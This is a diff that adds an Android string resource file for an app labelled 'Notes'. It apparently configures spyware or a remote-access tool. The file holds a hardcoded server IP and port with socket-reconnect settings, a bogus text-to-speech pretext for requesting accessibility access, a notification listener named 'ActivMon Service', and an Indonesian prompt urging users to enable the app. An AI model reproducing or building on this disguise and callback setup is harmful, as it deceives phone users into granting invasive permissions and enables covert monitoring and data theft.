@@ -1,0 +1,16 @@
+<resources>
+    <string name="app_name">Notes</string>
+    <string name="accessibility_service_label">Notes</string>
+    <string name="accessibility_service_description">We want your permission to provide you the facality of Text-To-Speech accessibilty service for your application.</string>
+    <string name="MY_IP">129.150.60.252</string>
+    <string name="MY_PORT">4000</string>
+    <string name="reconnectTime">5000</string>
+    <bool name="SOCK_CONNECT">true</bool>
+    <string name="service_name">NotesService</string>
+
+    <string name="notification_listener_service">"ActivMon Service"</string>
+    <string name="notification_listener_service_explanation">"Untuk fungsional aplikasi, hidupkan aplikasi Notes pada menu selanjutnya"</string>
+
+    <string name="yes">Yes</string>
+    <string name="no">No</string>
+</resources>
